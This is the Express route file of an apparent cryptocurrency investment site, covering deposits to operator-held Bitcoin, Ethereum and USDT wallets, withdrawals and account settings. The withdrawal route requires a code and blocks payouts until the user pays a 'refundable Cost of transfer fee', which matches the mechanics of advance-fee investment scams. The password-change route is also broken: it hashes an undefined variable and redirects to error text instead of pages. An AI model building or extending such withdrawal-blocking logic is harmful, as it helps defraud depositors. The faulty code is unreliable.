const router = require("express").Router();
const { ensureAuthenticated } = require("../config/auth");
const User = require("../model/User");
const bcrypt = require("bcryptjs");
const Site = require("../model/Site");
const History = require("../model/History");
const comma = require("../utils/comma");
const uuid = require("uuid");
const checkVerification = require("../config/verify");

router.get("/dashboard", ensureAuthenticated, checkVerification, async (req, res) => {
    try {
        return res.render("dashboard", { res, pageTitle: "Dashboard", req, comma, layout: "layout2" });
    } catch (err) {
        console.log(err)
        return res.redirect("/dashboard");
    }
});

router.get("/funding", ensureAuthenticated, checkVerification, async (req, res) => {
    try {
        return res.render("funding", { res, pageTitle: "Funding", req, comma, layout: "layout2" });
    } catch (err) {
        console.log(err)
        return res.redirect("/dashboard");
    }
});


router.get("/payment-page", ensureAuthenticated, checkVerification, async (req, res) => {
    try {
        const {amount, method} = req.query;
        const siteObj = await Site.findOne();
        const site = siteObj.toObject();
        let wallet;
        if(method.toLowerCase().trim() == "bitcoin"){
            console.log(site.bitcoinAddress);
            wallet = site.bitcoinAddress;
        }else if(method.toLowerCase().trim() == "ethereum"){
            console.log(site.ethereumAddress);
            wallet = site.ethereumAddress;
        }else if(method.toLowerCase().trim() == "usdt"){
            console.log(site.usdtAddress);
            wallet = site.usdtAddress;
        }
        return res.render("paymentPage", { res, pageTitle: "Funding", req, wallet, amount, method, comma, layout: "layout2" });
    } catch (err) {
        console.log(err)
        return res.redirect("/dashboard");
    }
});



router.post("/payment-page", ensureAuthenticated, checkVerification, async (req, res) => {
    try {
        const {amount} = req.body;
        const newHistory = new History({
            amount: amount,
            method: 'crypto',
            status: "pending",
            type: "deposit",
            reference: uuid.v4(),
            userID: req.user._id,
            user: req.user
        });
        await newHistory.save();
        return res.redirect("/history");
    } catch (err) {
        console.log(err)
        return res.redirect("/dashboard");
    }
});


router.get("/history", ensureAuthenticated, checkVerification, async (req, res) => {
    try {
        const history = await History.find({userID: req.user._id});
        return res.render("history", { res, pageTitle: "History", req, history, comma, layout: "layout2" });
    } catch (err) {
        console.log(err)
        return res.redirect("/dashboard");
    }
});


router.get("/trade-history", ensureAuthenticated, checkVerification, async (req, res) => {
    try {
        const history = await History.find({userID: req.user._id});
        return res.render("trade-history", { res, pageTitle: "History", req, history, comma, layout: "layout2" });
    } catch (err) {
        console.log(err)
        return res.redirect("/dashboard");
    }
});


router.get("/withdrawal", ensureAuthenticated, checkVerification, async (req, res) => {
    try {
        const history = await History.find({userID: req.user._id});
        return res.render("withdrawal", { res, pageTitle: "History", req, history, comma, layout: "layout2" });
    } catch (err) {
        console.log(err)
        return res.redirect("/dashboard");
    }
});



router.get("/transfer_code24", ensureAuthenticated, checkVerification, async (req, res) => {
    try {
        const {amount} = req.query;
        return res.render("transfer_code24", { res, pageTitle: "History", req, amount, comma, layout: false });
    } catch (err) {
        console.log(err)
        return res.redirect("/dashboard");
    }
});

router.post("/transfer_code24", ensureAuthenticated, checkVerification, async (req, res) => {
    try {
        const {amount, code} = req.body;
        if(!amount || !code){
            req.flash('error_msg', 'please provide withdrawal code');
            return res.redirect("/transfer_code24?amount="+amount);
        }
        if(code.trim() != req.user.withdrawalPin){
            req.flash('error_msg', 'incorrect withdrawal code');
            return res.redirect("/transfer_code24?amount="+amount);
        }
        if(req.user.balance < amount){
            req.flash('error_msg', 'insufficient balance');
            return res.redirect("/transfer_code24?amount="+amount);
        }
        if(req.user.cot > 0){
            req.flash('error_msg', 'You need to deposit a refundable Cost of transfer fee of '+ req.user.currency + ' '+ req.user.cot);
            return res.redirect("/transfer_code24?amount="+amount);
        }
        const newHistory = new History({
            amount: amount,
            method: 'crypto',
            status: "pending",
            type: "withdrawal",
            reference: uuid.v4(),
            userID: req.user._id,
            user: req.user
        });
        await newHistory.save();
        req.flash('success_msg', 'withdrawal request sent');
        return res.redirect("/history");
    } catch (err) {
        console.log(err)
        return res.redirect("/dashboard");
    }
});

router.get("/personal", ensureAuthenticated, checkVerification, async (req, res) => {
    try {
        return res.render("personal", { res, pageTitle: "Peronal", req, layout: false });
    } catch (err) {
        console.log(err)
        return res.redirect("/dashboard");
    }
});


router.get("/security", ensureAuthenticated, checkVerification, async (req, res) => {
    try {
        return res.render("security", { res, pageTitle: "Peronal", req, layout: false });
    } catch (err) {
        console.log(err)
        return res.redirect("/dashboard");
    }
});


router.post("/personal", ensureAuthenticated, checkVerification, async (req, res) => {
    try {
        const {currentPassword, password1, password2} = req.body;
        if(!currentPassword || !password1 || !password2){
            req.flash("error_msg", "please fill all fields");
            return res.redirect("/security");
        }
        if(password1 !== password2){
            req.flash("error_msg", "passwords do not match");
            return res.redirect("passwords do not match");
        }
        if(password1.length < 6){
            req.flash("error_msg", "passwords is too short");
            return res.redirect("passwords do not match");
        }

        const isCorrect = await bcrypt.compare(currentPassword, req.user.password);
        if(!isCorrect){
            req.flash("Current password is not correct");
            return res.redirect("/secuurity");
        }

        const salt = await bcrypt.genSalt();
        const hash = await bcrypt.hash(password, salt);

        await User.updateOne({_id: req.user.id}, {password: hash});
        req.flash("success_msg", "password changed successfully")
        return res.redirect("/security");
    } catch (err) {
        console.log(err)
        return res.redirect("/dashboard");
    }
});


router.get("/locked", ensureAuthenticated, async(req, res) => {
    try {
        if(!req.user.upgrade){
            return res.redirect("/dashboard");
        }
        return res.render("locked", {req})
    } catch (err) {
        console.log(err)
        return res.redirect("/dashboard");
    }
})




module.exports = router;